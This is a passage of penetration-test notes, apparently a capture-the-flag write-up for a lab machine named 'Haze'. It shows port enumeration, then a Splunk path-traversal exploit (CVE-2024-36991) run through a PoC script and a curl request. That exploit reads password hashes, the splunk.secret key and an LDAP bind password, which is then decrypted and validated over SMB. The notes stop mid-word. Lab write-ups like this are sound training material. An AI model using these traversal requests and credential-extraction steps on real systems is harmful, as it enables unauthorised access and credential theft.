
# Host file setup
```python
sudo nxc smb 10.129.11.223 --generate-hosts-file /etc/hosts
[sudo] password for kali: 
SMB         10.129.11.223   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT dc01.haze.htb                                                                                                                                   
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-07 16:31 +0100
Nmap scan report for dc01.haze.htb (10.129.11.223)
Host is up (0.013s latency).
rDNS record for 10.129.11.223: DC01.haze.htb
Not shown: 65505 closed tcp ports (conn-refused)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
8000/tcp  open  http-alt
8088/tcp  open  radan-http
8089/tcp  open  unknown
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49674/tcp open  unknown
49683/tcp open  unknown
49684/tcp open  unknown
64858/tcp open  unknown
64865/tcp open  unknown
64868/tcp open  unknown
64883/tcp open  unknown
64918/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 11.22 seconds
```

## Nmap
```python
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,8000,8088,8089,9389 -A --min-rate=2000 -sT dc01.haze.htb                                                            
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-07 16:33 +0100
Nmap scan report for dc01.haze.htb (10.129.11.223)
Host is up (0.013s latency).
rDNS record for 10.129.11.223: DC01.haze.htb

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-07 23:33:45Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Not valid before: 2026-06-07T23:20:32
|_Not valid after:  2027-06-07T23:20:32
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Not valid before: 2026-06-07T23:20:32
|_Not valid after:  2027-06-07T23:20:32
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Not valid before: 2026-06-07T23:20:32
|_Not valid after:  2027-06-07T23:20:32
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Not valid before: 2026-06-07T23:20:32
|_Not valid after:  2027-06-07T23:20:32
|_ssl-date: TLS randomness does not represent time
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8000/tcp open  http          Splunkd httpd
|_http-server-header: Splunkd
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://dc01.haze.htb:8000/en-US/account/login?return_to=%2Fen-US%2F
| http-robots.txt: 1 disallowed entry 
|_/
8088/tcp open  ssl/http      Splunkd httpd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2025-03-05T07:29:08
|_Not valid after:  2028-03-04T07:29:08
| http-robots.txt: 1 disallowed entry 
|_/
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Splunkd
|_http-title: 404 Not Found
8089/tcp open  ssl/http      Splunkd httpd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2025-03-05T07:29:08
|_Not valid after:  2028-03-04T07:29:08
|_http-title: splunkd
|_http-server-header: Splunkd
|_ssl-date: TLS randomness does not represent time
| http-robots.txt: 1 disallowed entry 
|_/
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (96%), Microsoft Windows Server 2016 (96%), Microsoft Windows 11 24H2 (96%), Microsoft Windows Server 2022 (95%), Microsoft Windows 11 24H2 - 25H2 (95%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2019 (92%), Microsoft Windows Server 2016 or Server 2019 (91%), Microsoft Windows Server 2012 (91%), Microsoft Windows 10 1703 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB (445)
Null auth is enabled but i cannot use it to list shares or dump users

Guest account is disabled

# HTTP (8000)
## Nuclei
```python
nuclei -u http://haze.htb:8000/       

[CVE-2024-36991] [http] [high] http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Windows/win.ini
[INF] Skipped haze.htb:9780 from target list as found unresponsive permanently: cause="port closed or filtered" address=haze.htb:9780 chain="connection refused; got err while executing http://haze.htb:9780/api/v1/user_assets/nfc"
[ldap-metadata] [javascript] [info] haze.htb:8000 ["DomainControllerFunctionality: 7","BaseDN: dc=8000","DnsHostName: dc01.haze.htb","DefaultNamingContext: DC=haze,DC=htb","DomainFunctionality: 7","ForestFunctionality: 7"]
[splunk-enterprise-panel] [http] [info] http://haze.htb:8000/en-US/account/login
[http-missing-security-headers:content-security-policy] [http] [info] http://haze.htb:8000/en-GB/account/login?return_to=%2Fen-GB%2F
[http-missing-security-headers:permissions-policy] [http] [info] http://haze.htb:8000/en-GB/account/login?return_to=%2Fen-GB%2F
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://haze.htb:8000/en-GB/account/login?return_to=%2Fen-GB%2F
[http-missing-security-headers:referrer-policy] [http] [info] http://haze.htb:8000/en-GB/account/login?return_to=%2Fen-GB%2F
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://haze.htb:8000/en-GB/account/login?return_to=%2Fen-GB%2F
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://haze.htb:8000/en-GB/account/login?return_to=%2Fen-GB%2F
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://haze.htb:8000/en-GB/account/login?return_to=%2Fen-GB%2F
[http-missing-security-headers:strict-transport-security] [http] [info] http://haze.htb:8000/en-GB/account/login?return_to=%2Fen-GB%2F
[http-missing-security-headers:referrer-policy] [http] [info] http://haze.htb:8000/en-GB/
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://haze.htb:8000/en-GB/
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://haze.htb:8000/en-GB/
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://haze.htb:8000/en-GB/
[http-missing-security-headers:strict-transport-security] [http] [info] http://haze.htb:8000/en-GB/
[http-missing-security-headers:content-security-policy] [http] [info] http://haze.htb:8000/en-GB/
[http-missing-security-headers:permissions-policy] [http] [info] http://haze.htb:8000/en-GB/
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://haze.htb:8000/en-GB/
[http-missing-security-headers:permissions-policy] [http] [info] http://haze.htb:8000/
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://haze.htb:8000/
[http-missing-security-headers:referrer-policy] [http] [info] http://haze.htb:8000/
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://haze.htb:8000/
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://haze.htb:8000/
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://haze.htb:8000/
[http-missing-security-headers:strict-transport-security] [http] [info] http://haze.htb:8000/
[http-missing-security-headers:content-security-policy] [http] [info] http://haze.htb:8000/
[robots-txt-endpoint] [http] [info] http://haze.htb:8000/robots.txt
[robots-txt] [http] [info] http://haze.htb:8000/robots.txt
[missing-cookie-samesite-strict] [http] [info] http://haze.htb:8000/en-GB/account/login?return_to=%2Fen-GB%2F ["cval=1064979552; Path=/en-GB/account/ splunkweb_uid=D49EBB76-3DE2-417C-9AA2-38EE230638CB; Path=/en-GB/account; Max-Age=157680000; Expires=Fri, 06 Jun 2031 23:44:30 GMT"]
[fingerprinthub-web-fingerprints:splunk] [http] [info] http://haze.htb:8000/en-GB/account/login?return_to=%2Fen-GB%2F
[fingerprinthub-web-fingerprints:splunkd] [http] [info] http://haze.htb:8000/en-GB/account/login?return_to=%2Fen-GB%2F
[missing-cookie-samesite-strict] [http] [info] http://haze.htb:8000/en-GB/ ["session_id_8000=291dda4b4ddb6c2dc26ea8c71ecd2bdd833b8633; expires=Mon, 08 Jun 2026 00:44:30 GMT; HttpOnly; Max-Age=3600; Path=/"]
[fingerprinthub-web-fingerprints:splunk] [http] [info] http://haze.htb:8000/en-GB/
[fingerprinthub-web-fingerprints:splunkd] [http] [info] http://haze.htb:8000/en-GB/
[fingerprinthub-web-fingerprints:splunk] [http] [info] http://haze.htb:8000/
[fingerprinthub-web-fingerprints:splunkd] [http] [info] http://haze.htb:8000/
[caa-fingerprint] [dns] [info] haze.htb
```
CVE-2024-36991?


# CVE-2024-36991

https://github.com/bigb0x/CVE-2024-36991/blob/main/CVE-2024-36991.py

```python
python3 CVE-2024-36991.py -u http://haze.htb:8000/     
/home/kali/htb/haze/CVE-2024-36991/CVE-2024-36991.py:55: SyntaxWarning: invalid escape sequence '\ '
  LOG_DIR = 'logs'

                                                                        
  ______     _______     ____   ___ ____  _  _        _____  __   ___   ___  _ 
 / ___\ \   / | ____|   |___ \ / _ |___ \| || |      |___ / / /_ / _ \ / _ \/ |
| |    \ \ / /|  _| _____ __) | | | |__) | || |_ _____ |_ \| '_ | (_) | (_) | |
| |___  \ V / | |__|_____/ __/| |_| / __/|__   _|________) | (_) \__, |\__, | |
 \____|  \_/  |_____|   |_____|\___|_____|  |_|      |____/ \___/  /_/   /_/|_|
                                                                           
-> POC CVE-2024-36991. This exploit will attempt to read Splunk /etc/passwd file. 
-> By x.com/MohamedNab1l
-> Use Wisely.

[INFO] Log directory created: logs
[INFO] Testing single target: http://haze.htb:8000/
[VLUN] Vulnerable: http://haze.htb:8000/
:admin:$6$Ak3m7.aHgb/NOQez$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1::Administrator:admin:changeme@example.com:::20152
:edward:$6$3LQHFzfmlpMgxY57$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152
:mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152
:paul:$6$Y5ds8NjDLd7SzOTW$Zg/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152
```
This looks like its dumped hashes for four users!

Of course these are hashes and to crack these ill have to get the `splunk.secret` 

After doing some research i find the path is `C:\Program Files\Splunk\etc\auth\splunk.secret`

![](Pasted%20image%2020260607170045.png)

I found the secret

```python
NfKeJCdFGKUQUqyQmnX/WM9xMn5uVF32qyiofYPHkEOGcpMsEN.lRPooJnBdEL5Gh2wm12jKEytQoxsAYA5mReU9.h0SYEwpFMDyyAuTqhnba9P2Kul0dyBizLpq6Nq5qiCTBK3UM516vzArIkZvWQLk3Bqm1YylhEfdUvaw1ngVqR1oRtg54qf4jG0X16hNDhXokoyvgb44lWcH33FrMXxMvzFKd5W3TaAUisO6rnN0xqB7cHbofaA1YV9vgD
```

After some research i find i can use a tool called splunksecrets for password decryption.

https://github.com/HurricaneLabs/splunksecrets

For some reason i cannot get these to decrypt, the only possible explanation is these are not the right ciphertexts for this secret

Ill do some more research on other possible ciphertexts stored in the splunk config

```python
curl 'http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/system/local/authentication.conf' --path-as-is 
[splunk_auth]
minPasswordLength = 8
minPasswordUppercase = 0
minPasswordLowercase = 0
minPasswordSpecial = 0
minPasswordDigit = 0

[Haze LDAP Auth]
SSLEnabled = 0
anonymous_referrals = 1
bindDN = CN=Paul Taylor,CN=Users,DC=haze,DC=htb
bindDNpassword = $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=
charset = utf8
emailAttribute = mail
enableRangeRetrieval = 0
groupBaseDN = CN=Splunk_LDAP_Auth,CN=Users,DC=haze,DC=htb
groupMappingAttribute = dn
groupMemberAttribute = member
groupNameAttribute = cn
host = dc01.haze.htb
nestedGroups = 0
network_timeout = 20
pagelimit = -1
port = 389
realNameAttribute = cn
sizelimit = 1000
timelimit = 15
userBaseDN = CN=Users,DC=haze,DC=htb
userNameAttribute = samaccountname

[authentication]
authSettings = Haze LDAP Auth
authType = LDAP
```
Now i have found another hash, for a user paul taylor

![](Pasted%20image%2020260607172227.png)

```python
Ld@p_Auth_Sp1unk@2k24
```
Since this was for the user paul taylor, ill try some possible combinations for paul, before trying something like username anarchy.

```python
nxc smb dc01.haze.htb -u 'paul.taylor' -p 'Ld@p_Auth_Sp1unk@2k24'
SMB         10.129.11.223   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.11.223   445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24
```
This useriu